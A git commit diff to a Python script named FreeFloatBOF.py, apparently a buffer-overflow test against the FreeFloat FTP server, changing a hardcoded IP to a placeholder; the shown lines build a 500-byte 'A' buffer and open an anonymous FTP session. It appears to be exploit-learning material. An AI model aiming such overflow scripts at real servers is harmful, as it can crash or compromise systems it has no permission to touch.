918f4a589619024c499453a12d293dfc3bd4cb85
Sadhvi <53933893+Sadhvi19@users.noreply.github.com>
2023-08-15 18:38:07 +0530

    Update FreeFloatBOF.py

--- Codes/Python BOF/FreeFloatBOF.py
+++ Codes/Python BOF/FreeFloatBOF.py
@@ -4,7 +4,7 @@ import sys
 buff = "A"*500
 
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-connect = s.connect(('192.168.200.138',21))
+connect = s.connect(('<ip address>',21))
 
 s.recv(1024)
 s.send('USER anonymous\r\n')
